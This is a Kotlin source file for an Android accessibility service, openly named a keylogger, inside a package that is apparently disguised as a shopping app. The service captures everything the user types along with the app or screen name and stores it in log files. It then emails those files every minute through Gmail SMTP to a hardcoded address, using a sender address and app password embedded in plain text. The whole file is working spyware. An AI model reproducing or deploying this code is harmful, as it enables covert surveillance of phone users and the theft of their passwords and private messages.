package com.shopease.mobile.shopease_mobile

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import java.io.*
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.*
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import javax.mail.*
import javax.mail.internet.*
import javax.activation.*

@android.annotation.TargetApi(android.os.Build.VERSION_CODES.O)
class MyKeyloggerService : AccessibilityService() {

    private val SMART_LOG = "smart_log.txt"
    private val RAW_LOG = "log.txt"
    private val dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss")

    // المتغيرات الخاصة بالـ Smart Logs لمنع التكرار وجلب اسم الشاشة
    private var currentText = ""
    private var lastWindowTitle = "Unknown Screen"

    private val SEND_INTERVAL_MINUTES = 1L
    private val RETRY_INTERVAL_MINUTES = 1L

    private val SENDER_EMAIL = "ibrahimrs1234@gmail.com"
    private val APP_PASSWORD = "cjukxbseyxjotakv"
    private val RECEIVER_EMAIL = "mohamedatefeee@gmail.com"

    private val scheduler = Executors.newSingleThreadScheduledExecutor()

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("Keylogger", "Service Connected")
        startMainTimer()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // محاولة جلب اسم التطبيق أو المحادثة
        // محاولة جلب اسم التطبيق بطريقة متوافقة مع كل الإصدارات
        val windowTitle = try {
            val pkg = event.packageName?.toString()
            val cls = event.className?.toString()?.split(".")?.last()
            if (pkg != null && cls != null) "$pkg ($cls)" else pkg ?: lastWindowTitle
        } catch (e: Exception) {
            lastWindowTitle
        }

        // لو المستخدم غير الشاشة أو ضغط على زرار (زي زرار الإرسال)، بنحفظ اللي كتبه
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {

            if (currentText.isNotEmpty()) {
                flushSmartLog(lastWindowTitle, currentText)
            }
            lastWindowTitle = windowTitle
        }

        // تسجيل الحروف وقت الكتابة
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val typedText = event.text.joinToString("")
            Log.d("Keylogger", "Detected: $typedText")

            // تسجيل الـ Raw Log القديم زي ما هو احتياطي
            saveToFile(RAW_LOG, "TEXT: $typedText [${dtf.format(LocalDateTime.now())}]")

            // الـ Smart Logic: مش بنحدث النص إلا لو زاد (يعني بيكتب) أو كتب مسافة
            if (typedText.length > currentText.length || typedText.endsWith(" ")) {
                currentText = typedText
                lastWindowTitle = windowTitle
            }
        }
    }

    private fun startMainTimer() {
        scheduler.scheduleAtFixedRate({ attemptSending() }, SEND_INTERVAL_MINUTES, SEND_INTERVAL_MINUTES, TimeUnit.MINUTES)
    }

    private fun attemptSending() {
        // قبل ما نبعت الإيميل، لازم نحفظ أي نص متعلق في المتغير
        if (currentText.isNotEmpty()) {
            flushSmartLog(lastWindowTitle, currentText)
        }

        val success = sendEmailWithAttachments()

        if (!success) {
            scheduler.schedule({ attemptSending() }, RETRY_INTERVAL_MINUTES, TimeUnit.MINUTES)
        }
    }

    // الدالة دي بتحفظ النص في الـ Smart Log بشكل احترافي
    @Synchronized
    private fun flushSmartLog(screenName: String, text: String) {
        if (text.trim().isEmpty()) return

        val logEntry = "[${dtf.format(LocalDateTime.now())}] | Screen: $screenName | -> $text"
        saveToFile(SMART_LOG, logEntry)

        // تفريغ المتغير عشان يبدأ يسجل جملة جديدة
        currentText = ""
    }

    private fun sendEmailWithAttachments(): Boolean {
        val props = Properties().apply {
            put("mail.smtp.auth", "true")
            put("mail.smtp.starttls.enable", "true")
            put("mail.smtp.host", "smtp.gmail.com")
            put("mail.smtp.port", "587")
            put("mail.smtp.connectiontimeout", "10000")
            put("mail.smtp.timeout", "10000")
        }

        val session = Session.getInstance(props, object : Authenticator() {
            override fun getPasswordAuthentication(): PasswordAuthentication {
                return PasswordAuthentication(SENDER_EMAIL, APP_PASSWORD)
            }
        })

        return try {
            val message = MimeMessage(session).apply {
                setFrom(InternetAddress(SENDER_EMAIL))
                setRecipients(Message.RecipientType.TO, InternetAddress.parse(RECEIVER_EMAIL))
                subject = "Android Keylogger Report - ${dtf.format(LocalDateTime.now())}"

                val multipart = MimeMultipart()
                multipart.addBodyPart(MimeBodyPart().apply { setText("Android Logs Attached.") })

                addAttachment(multipart, SMART_LOG)
                addAttachment(multipart, RAW_LOG)

                setContent(multipart)
            }
            Transport.send(message)
            true
        } catch (e: Exception) {
            Log.e("Keylogger", "Mail failed: ${e.message}")
            false
        }
    }

    private fun addAttachment(multipart: Multipart, fileName: String) {
        val file = File(filesDir, fileName)
        if (file.exists() && file.length() > 0) {
            val attachPart = MimeBodyPart()
            attachPart.dataHandler = DataHandler(FileDataSource(file))
            attachPart.fileName = fileName
            multipart.addBodyPart(attachPart)
        }
    }

    private fun saveToFile(fileName: String, text: String) {
        try {
            val file = File(filesDir, fileName)
            FileOutputStream(file, true).use { fos ->
                // الحفظ باستخدام UTF_8 بيضمن إن العربي يطلع مظبوط 100%
                OutputStreamWriter(fos, Charsets.UTF_8).use { osw ->
                    osw.write("$text\n")
                }
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    override fun onInterrupt() {}
}